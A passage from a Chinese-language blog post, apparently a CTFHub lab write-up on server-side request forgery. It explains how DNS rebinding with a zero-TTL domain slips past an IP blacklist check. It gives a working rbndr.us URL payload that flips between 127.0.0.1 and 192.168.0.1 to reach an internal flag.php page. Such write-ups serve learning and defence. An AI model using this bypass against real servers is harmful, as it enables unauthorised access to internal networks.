href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122720.jpg title=fad2b5581e17d2f940d3841fb53fab24_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122720.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122720.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122720.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122720.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122720.jpg 2x" sizes=auto alt=fad2b5581e17d2f940d3841fb53fab24_MD5></a></figure></p><blockquote><p>对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122721.jpg title=8a1ed33fe8ef5a60e51f7cd609c4c430_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122721.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122721.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122721.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122721.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122721.jpg 2x" sizes=auto alt=8a1ed33fe8ef5a60e51f7cd609c4c430_MD5></a></figure></p><p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行攻击了，完整的攻击流程为：</p><ol><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ol></blockquote><p>由于我们无法在程序运行时以毫秒为单位手动更改dns记录，因此需要配置一个自定义DNS服务器，并设定好某些域名的解析IP，再将TTL设置为0，这样后端就不会有缓存。我们可以自己编写解析服务，也可以利用这个网站获取一个测试用的域名：<a href=https://lock.cmpxchg8b.com/rebinder.html target=_blank rel="noopener noreferrer">https://lock.cmpxchg8b.com/rebinder.html</a></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122722.jpg title=21b212807a9e8e2cfc024b0677f139be_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122722.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122722.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122722.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122722.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122722.jpg 2x" sizes=auto alt=21b212807a9e8e2cfc024b0677f139be_MD5></a></figure></p><p>通过修该域名对应的IP，使一个域名对应两个IP，那么在多次的访问之下产生的访问效果是一样的实现IP绕过。但是它只能在2个IP之间随机变化，因此往往需要发送多个请求才能得到我想要的结果。</p><p>我们利用该域名即可绕过限制成功访问flag.php得到flag，但是要不停访问数次才行（可以借助burpsuite）：</p><p><code>&lt;font style="color:rgb(51, 51, 51);">?url=7f000001.c0a80001.rbndr.us/flag.php&lt;/font></code></p><p>访问过程中会不断出现以下报错，这是因为这个域名是不断的在127.0.0.1与192.168.0.1之间跳动的，所以要不断访问数次，这边用 bp 测试</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122723.jpg title=42f6e676bc14d5e426ec2eab21653842_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122723.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122723.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122723.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122723.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122723.jpg 2x" sizes=auto alt=42f6e676bc14d5e426ec2eab21653842_MD5></a></figure></p><p><a href=https://zhuanlan.zhihu.com/p/89426041 target=_blank rel="noopener noreferrer">浅谈DNS重绑定漏洞</a></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 1019-22-12</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><button title="分享到 Twitter" data-sharer=twitter data-url=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/ data-title="[SSRF]CTFHUB SSRF" data-hashtags=SSRF><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer=facebook data-url=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/ data-hashtag=SSRF><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/ data-title="[SSRF]CTFHUB SSRF" data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer=line data-url=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/ data-title="[SSRF]CTFHUB SSRF"><span data-svg-src=/lib/simple-icons/icons/line.min.svg></span></button><button title="分享到 微博" data-sharer=weibo data-url=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/ data-title="[SSRF]CTFHUB SSRF"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer=myspace data-url=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/ data-title="[SSRF]CTFHUB SSRF" data-description><span data-svg-src=/lib/simple-icons/icons/myspace.min.svg></span></button><button title="分享到 Blogger" data-sharer=blogger data-url=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/ data-title="[SSRF]CTFHUB SSRF" data-description><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer=evernote data-url=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/ data-title="[SSRF]CTFHUB SSRF"><span class="fab fa-evernote fa-fw"></span></button></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/ssrf/>SSRF</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/ class=prev rel=prev title=[反序列化]POP链><i class="fas fa-angle-left fa-fw"></i>[反序列化]POP链</a>
<a href=/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/ class=next rel=next title=[PHP特性]总结>[PHP特性]总结<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/katex/copy-tex.min.css><noscript><link rel=stylesheet href=/lib/katex/copy-tex.min.css></noscript><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},data:{"desktop-header-typeit":"Nexuzzz0's BLOG","mobile-header-typeit":"Nexuzzz0's BLOG"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{distance:100,findAllMatches:!1,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,useExtendedSearch:!1},sharerjs:!0,table:{sort:!0},typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},duration:-1,speed:100}}</script><script type=text/javascript src=/lib/tablesort/tablesort.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/typeit/typeit.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js defer></script><script type=text/javascript src=/lib/katex/auto-render.min.js defer></script><script type=text/javascript src=/lib/katex/copy-tex.min.js defer></script><script type=text/javascript src=/lib/katex/mhchem.min.js defer></script><script type=text/javascript src=/js/katex.min.js defer></script><script type=text/javascript src=/js/theme.min.js defer></script></div></body></html>